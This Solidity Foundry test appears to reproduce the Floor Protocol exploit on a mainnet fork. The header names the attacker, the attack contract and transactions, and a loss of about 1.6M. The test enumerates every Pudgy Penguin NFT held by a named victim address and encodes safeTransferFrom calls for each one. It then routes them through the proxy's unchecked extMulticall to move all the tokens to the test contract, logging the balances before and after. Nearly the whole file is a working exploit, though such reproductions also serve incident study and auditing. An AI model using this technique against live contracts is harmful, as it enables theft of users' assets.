// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~1,6M
// Attacker : https://etherscan.io/address/0x4d0d746e0f66bf825418e6b3def1a46ec3c0b847
// Attack Contract : https://etherscan.io/address/0x7e5433f02f4bf07c4f2a2d341c450e07d7531428
// Vulnerable Contract : https://etherscan.io/address/0xc538d17a6aacc5271be5f51b891e2e92c8187edd
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0xec8f6d8e114caf8425736e0a3d5be2f93bbea6c01a50a7eeb3d61d2634927b40
// Other attack txs: https://explorer.phalcon.xyz/tx/eth/0xfb9942a119c45adab3980639cd829e57b41449e3b82d610892da4bb921e81d9c
// https://explorer.phalcon.xyz/tx/eth/0xa329b27fbe0f7b7f92060a9e5370fdf03d60e5c4835f09d7234e5bbecf417ccf

// @Analysis
// https://protos.com/floor-protocol-exploited-bored-apes-and-pudgy-penguins-gone/
// https://twitter.com/0xfoobar/status/1736190355257627064
// https://defimon.xyz/exploit/mainnet/0x7e5433f02f4bf07c4f2a2d341c450e07d7531428

interface IPPGToken is IERC721 {
    function tokenOfOwnerByIndex(
        address owner,
        uint256 index
    ) external view returns (uint256);
}

interface IERC1967Proxy {
    struct CallData {
        address target;
        bytes callData;
    }

    function extMulticall(
        CallData[] memory calls
    ) external returns (bytes[] memory);
}

contract ContractTest is Test {
    IPPGToken private constant PPG =
        IPPGToken(0xBd3531dA5CF5857e7CfAA92426877b022e612cf8);
    IERC1967Proxy private constant ERC1967Proxy =
        IERC1967Proxy(0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE);
    address private constant victim =
        0xe5442aE87E0fEf3F7cc43E507adF786c311a0529;

    function setUp() public {
        vm.createSelectFork("mainnet", 18802287);
        vm.label(address(PPG), "PPG");
        vm.label(address(ERC1967Proxy), "ERC1967Proxy");
        vm.label(victim, "victim");
    }

    function testExploit() public {
        emit log_named_uint(
            "Victim PPG token balance before attack",
            PPG.balanceOf(victim)
        );
        emit log_named_uint(
            "Attacker PPG token balance before attack",
            PPG.balanceOf(address(this))
        );

        IERC1967Proxy.CallData[] memory calls = new IERC1967Proxy.CallData[](
            PPG.balanceOf(victim)
        );

        for (uint256 i; i < PPG.balanceOf(victim); ++i) {
            uint256 id = PPG.tokenOfOwnerByIndex(victim, i);
            bytes memory data = abi.encodeWithSignature(
                "safeTransferFrom(address,address,uint256)",
                victim,
                address(this),
                id
            );
            IERC1967Proxy.CallData memory callData = IERC1967Proxy.CallData({
                target: address(PPG),
                callData: data
            });
            calls[i] = callData;
        }
        // Flawed function
        ERC1967Proxy.extMulticall(calls);

        emit log_named_uint(
            "Victim PPG token balance after attack",
            PPG.balanceOf(victim)
        );
        emit log_named_uint(
            "Attacker PPG token balance after attack",
            PPG.balanceOf(address(this))
        );
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
